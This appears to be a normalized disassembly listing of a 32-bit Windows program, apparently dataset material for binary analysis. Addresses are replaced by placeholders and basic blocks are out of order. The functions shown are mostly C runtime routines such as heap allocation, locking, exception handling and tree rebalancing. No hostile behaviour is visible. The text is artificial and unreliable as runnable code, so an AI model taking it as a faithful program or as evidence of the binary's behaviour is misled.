lea eax [ ebp - 0x1ad4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ad4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_403231
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_407759
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_412f56
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_403290
push ebp
mov ebp esp
push 0xffffffff
push sub_41600b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0xc
call sub_4066cf
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0x8 ]
push eax
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x1
call sub_40c580
mov [ esi ] eax
jmp r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0x8007000e
call sub_40b3f0
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebx ] esi
test esi esi
jne r-xdata
sub_403316
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_4033b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ SysStringLen@IAT ]
push edi
mov ebx ecx
mov edi eax
mov eax [ ebx ]
push eax
call esi
mov ecx [ edi ]
push ecx
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ ebp - 0x4 ]
cmp ecx eax
jbe r-xdata
mov esi [ ebx ]
mov edx [ edi ]
test ecx ecx
je r-xdata
mov ecx eax
mov ecx [ ebp - 0x4 ]
cmp ecx eax
jae r-xdata
nop
xor edx edx
cmp ecx eax
setne dl
pop edi
pop esi
pop ebx
mov eax edx
mov esp ebp
pop ebp
retn
pop edi
pop esi
or eax 0xffffffff
pop ebx
mov esp ebp
pop ebp
retn
movzx eax [ esi - 0x2 ]
movzx edx [ edx - 0x2 ]
pop edi
pop esi
sub eax edx
pop ebx
mov esp ebp
pop ebp
retn
test ecx ecx
jne r-xdata
mov di [ esi ]
mov bx [ edx ]
dec ecx
add edx 0x2
add esi 0x2
cmp di bx
jne r-xdata
sub_403430
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x9c
push ebx
push esi
push edi
push sub_413540
call [ SetUnhandledExceptionFilter@IAT ]
push 0x8003
mov [ rw-data ] eax
call [ SetErrorMode@IAT ]
push 0xdc8
mov [ rw-data ] eax
call sub_4066cf
xor ebx ebx
add esp 0x4
cmp eax ebx
je r-xdata
xor eax eax
mov esi eax
call sub_4065a0
jmp r-xdata
call sub_40fb00
test al al
je r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov [ rw-data ] eax
call sub_411330
call sub_407300
test eax eax
je r-xdata
push 0x1c
call sub_4066cf
add esp 0x4
cmp eax ebx
je r-xdata
push ebx
call [ ExitProcess@IAT ]
xor eax eax
push 0xa
push eax
call sub_40f160
jmp r-xdata
push 0x1c
call sub_4066cf
add esp 0x4
cmp eax ebx
je r-xdata
push 0x1
call sub_404ac1
mov [ esp + 0x10 ] ebx
mov edx [ eax ]
mov edx [ edx + 0x4 ]
lea ecx [ esp + 0x10 ]
push ecx
mov ecx eax
call edx
mov [ esp + 0x28 ] eax
cmp eax ebx
jne r-xdata
xor eax eax
push 0xb
push eax
call sub_40f160
jmp r-xdata
lea esi [ esp + 0x3c ]
call sub_4131c0
lea esi [ esp + 0x14 ]
call sub_408850
push edi
lea eax [ esp + 0x78 ]
push eax
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] ebx
mov [ esp + 0x3c ] ebx
call sub_40e730
mov ecx [ esp + 0x74 ]
mov eax [ esp + 0x44 ]
mov [ esp + 0x3c ] ecx
mov ecx [ eax ]
push eax
push ecx
lea edi [ esp + 0x14 ]
lea esi [ esp + 0x48 ]
call sub_411a50
lea ebx [ esp + 0x78 ]
mov eax esi
call sub_4024c0
mov eax [ esp + 0x18 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ esp + 0x14 ]
lea eax [ esp + 0x1c ]
call sub_40ff10
lea ebx [ esp + 0x88 ]
lea eax [ esp + 0x14 ]
call sub_40a460
lea eax [ esp + 0x98 ]
lea ecx [ esp + 0x2c ]
call sub_401250
mov ecx [ esp + 0x28 ]
lea edx [ esp + 0x3c ]
push edx
mov edx [ esp + 0x14 ]
call sub_40f280
add esp 0x4
lea eax [ esp + 0x64 ]
push eax
lea ecx [ esp + 0x18 ]
call sub_410400
lea ecx [ esp + 0x64 ]
push ecx
call sub_4069f0
xor eax eax
xor edi edi
cmp [ rw-data ] edi
lea ecx [ esp + 0x54 ]
sete al
mov [ esp + 0x54 ] edi
mov [ esp + 0x58 ] edi
mov [ esp + 0x5c ] edi
mov [ esp + 0x50 ] eax
lea eax [ esp + 0x2c ]
call sub_401250
lea ecx [ esp + 0x50 ]
call sub_406230
push 0x2710
call [ Sleep@IAT ]
mov edx [ rw-data ]
push edx
call [ SetUnhandledExceptionFilter@IAT ]
mov eax [ rw-data ]
push eax
call [ SetErrorMode@IAT ]
mov eax [ esp + 0x54 ]
cmp eax edi
je r-xdata
push 0x1
call sub_404ac1
mov [ esp + 0x24 ] ebx
mov edx [ eax ]
mov edx [ edx + 0x4 ]
lea ecx [ esp + 0x24 ]
push ecx
mov ecx eax
call edx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ esp + 0x68 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ esp + 0x14 ]
lea eax [ esp + 0x6c ]
call sub_40ff10
mov ecx [ esp + 0x68 ]
push ecx
call sub_408b16
add esp 0x4
lea edx [ esp + 0x74 ]
push edx
call sub_405330
mov eax [ esp + 0x2c ]
cmp eax edi
je r-xdata
push eax
call sub_408b16
add esp 0x4
mov eax [ esp + 0x18 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ esp + 0x14 ]
lea eax [ esp + 0x1c ]
call sub_40ff10
mov eax [ esp + 0x18 ]
push eax
call sub_408b16
add esp 0x4
lea ecx [ esp + 0x3c ]
call sub_408990
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x10
push eax
call sub_408b16
add esp 0x4
sub_4036b0
push 0x8
push r--data
call sub_413ff0
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_414035
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_403730
push ebp
mov ebp esp
push 0xffffffff
push sub_4160f8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x10 ]
mov eax edi
call sub_40ff10
mov eax [ edi + 0x4 ]
push eax
call sub_408b16
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40378f
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40505a
add esp 0x1c
pop ebp
retn
sub_4037cf
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_40381b
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_411115
pop ecx
call sub_40f84f
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_40c4dc
push 0x1e
call sub_407a4a
push 0xff
call sub_40b064
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_40f84f
mov [ eax ] esi
push ebx
call sub_411115
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
call sub_40f84f
mov [ eax ] esi
sub_4038af
push 0x10
push r--data
call sub_413ff0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_406d2b
and [ eax ] 0x0
call sub_40f84f
mov [ eax ] 0x9
call sub_406d2b
and [ eax ] 0x0
call sub_40f84f
mov [ eax ] 0x9
cmp ebx [ rw-data ]
jb r-xdata
call sub_414035
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
mov eax 0x7fffffff
cmp eax [ ebp + 0x10 ]
sbb eax eax
inc eax
jne r-xdata
push ebx
call sub_40bc2e
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_406d2b
and [ eax ] 0x0
call sub_40f84f
mov [ eax ] 0x16
jmp r-xdata
call sub_40f84f
mov [ eax ] 0x9
call sub_406d2b
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_40bf12
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
call sub_40c515
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40399d
mov eax [ ebp - 0x1c ]
sub_4039a5
push 0x14
push r--data
call sub_413ff0
or [ ebp - 0x20 ] 0xffffffff
call sub_40c968
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_40ed6e
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_41450f
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_402a4b
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_414035
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_40513a
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_40f84f
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_40ab76
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_40ab76
pop ecx
push 0xd
call sub_40723f
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_403b06
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_40ab76
pop ecx
sub_403b60
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
call sub_4037cf
int3
sub_403b91
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_4042de
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_40b492
pop ecx
mov ebx eax
call sub_40f84f
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_413e10
add esp 0xc
sub_403c1d
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_402116
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_40f84f
mov [ eax ] 0x9
test al 0x1
je r-xdata
call sub_40f84f
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push 0x2
and eax 0xffffffef
pop ebx
or eax ebx
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_403722
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
mov edi ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] bx
call sub_4026f7
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x2 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
sub ecx ebx
mov [ esi + 0x4 ] ecx
test edi edi
jle r-xdata
push [ ebp + 0xc ]
call sub_40a117
pop ecx
test eax eax
jne r-xdata
call sub_403722
add eax 0x40
cmp esi eax
jne r-xdata
mov eax 0xffff
jmp r-xdata
mov eax ebx
and eax 0xffff
or [ esi + 0xc ] 0x20
mov eax 0xffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_4026f7
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_40d42e
pop ecx
pop edi
pop ebx
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ eax ] bx
jmp r-xdata
push ebx
push 0x0
push 0x0
push ecx
call sub_4015e5
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_403dd0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
sub esp 0x8
cmp [ eax + 0x15 ] 0x0
je r-xdata
push ebx
push esi
mov ebx eax
push edi
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ebx
call sub_402a00
mov ecx [ ebx ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
push r--data
call sub_40eab5
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov edi [ eax + 0x8 ]
cmp eax ebx
jne r-xdata
mov edi ecx
jmp r-xdata
cmp [ edi + 0x15 ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ ebx ]
mov [ eax ] ecx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x15 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov ecx [ ebx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov eax [ edx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx [ edx + 0x4 ]
mov [ ebp - 0x8 ] ecx
cmp [ ecx + 0x8 ] ebx
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
mov dl [ ebx + 0x14 ]
mov cl [ eax + 0x14 ]
mov [ eax + 0x14 ] dl
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x14 ] cl
mov eax [ ebp - 0x4 ]
mov bl 0x1
cmp [ eax + 0x14 ] bl
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov eax [ edi ]
cmp [ eax + 0x15 ] 0x0
mov ecx edi
jne r-xdata
mov ecx esi
jmp r-xdata
mov edx [ ebp - 0x4 ]
push edx
call sub_408b16
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
add esp 0x4
pop edi
pop esi
pop ebx
test eax eax
je r-xdata
mov ecx [ edx + 0x4 ]
cmp edi [ ecx + 0x4 ]
je r-xdata
mov eax edi
call sub_405eb0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax [ edx + 0x4 ]
mov [ eax ] ecx
nop
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov esp ebp
pop ebp
retn 0xc
dec eax
mov [ ecx + 0x8 ] eax
mov [ edi + 0x14 ] bl
cmp [ edi + 0x14 ] bl
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_40d060
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_4022a0
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x4 ]
mov edi esi
mov esi [ esi + 0x4 ]
cmp edi [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
jmp r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
je r-xdata
mov al [ esi + 0x14 ]
mov [ ecx + 0x14 ] al
mov [ esi + 0x14 ] bl
mov ecx [ ecx ]
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
call sub_40d060
mov eax [ ecx + 0x8 ]
mov [ eax + 0x14 ] bl
push edx
mov [ ecx + 0x14 ] 0x0
call sub_4022a0
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] 0x0
mov al [ esi + 0x14 ]
mov [ ecx + 0x14 ] al
mov [ esi + 0x14 ] bl
mov ecx [ ecx + 0x8 ]
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
call sub_4022a0
jmp r-xdata
mov eax [ ecx ]
mov [ eax + 0x14 ] bl
push edx
mov [ ecx + 0x14 ] 0x0
call sub_40d060
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x8 ]
sub_40402e
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_404ccf
add esp 0x18
pop ebp
retn
sub_404070
push ebx
mov ebx [ ecx ]
push esi
mov esi [ ecx + 0x4 ]
sub esi ebx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
push edi
cmp esi 0x9249248
jbe r-xdata
mov edi [ ecx + 0x8 ]
sub edi ebx
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov eax edx
shr eax 0x1f
inc esi
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_40458d
pop edi
pop esi
pop ebx
retn
mov edx eax
shr edx 0x1
mov edi 0x9249249
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_40aa70
mov eax esi
cmp eax esi
jae r-xdata
sub_4040e1
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_404130
cmp [ eax + 0x14 ] 0x10
push esi
push edi
mov edi [ eax + 0x10 ]
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
cmp [ edx + 0x14 ] 0x10
jb r-xdata
mov eax edi
mov esi [ edx + 0x10 ]
mov eax esi
cmp esi edi
jb r-xdata
call sub_4025a0
test eax eax
jne r-xdata
mov edx [ edx ]
pop edi
sets al
pop esi
retn
cmp esi edi
jae r-xdata
xor eax eax
cmp esi edi
setne al
test eax eax
or eax 0xffffffff
test eax eax
pop edi
sets al
pop esi
retn
sub_40417b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_4041b0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
test [ ebp + 0x8 ] 0x1
je r-xdata
push eax
call [ LocalFree@IAT ]
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_408b16
add esp 0x4
sub_4041f1
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_404c41
add esp 0x14
test esi esi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
call sub_40f84f
mov [ eax ] edi
call sub_40c515
mov eax edi
jmp r-xdata
push ebx
mov ebx [ ebp - 0x28 ]
xor eax eax
dec ebx
cmp [ ebp - 0x2c ] 0x2d
sete al
lea edi [ eax + esi ]
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_401400
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x28 ]
dec eax
cmp ebx eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] 0x0
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_40db78
add esp 0x10
test eax eax
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_4150db
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
pop ebx
test cl cl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_41523c
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] al
sub_4042de
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_40381b
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_40ab76
pop ecx
